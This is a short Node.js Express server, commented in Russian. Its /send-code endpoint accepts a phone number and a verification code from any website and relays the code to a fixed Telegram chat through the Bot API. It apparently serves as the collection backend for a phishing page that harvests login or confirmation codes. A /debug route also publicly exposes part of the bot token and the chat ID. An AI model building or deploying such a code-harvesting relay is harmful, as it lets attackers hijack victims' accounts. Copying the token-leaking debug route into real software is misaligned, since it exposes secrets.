const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.get('/debug', (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  res.json({
    token_exists: !!token,
    token_start: token ? token.substring(0, 10) + '...' : 'НЕТ',
    chat_id: chatId || 'НЕТ',
    keys: Object.keys(process.env).filter(function(k){ return k.indexOf('TELEGRAM') !== -1; })
  });
});

app.post('/send-code', async (req, res) => {
  const { phone, code } = req.body;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  console.log('Token:', token ? token.substring(0, 10) : 'НЕТ', '| Chat:', chatId);
  if (!token || !chatId) return res.status(500).json({ error: 'Не заданы переменные' });
  try {
    const response = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '🔐 Код: ' + code })
    });
    const data = await response.json();
    console.log('Telegram:', JSON.stringify(data));
    if (data.ok) res.json({ success: true });
    else res.status(500).json({ error: data.description || 'Ошибка' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/', function(req, res){ res.send('OK'); });

const PORT = process.env.PORT || 3000;
app.listen(PORT, function(){ console.log('Порт:', PORT); });
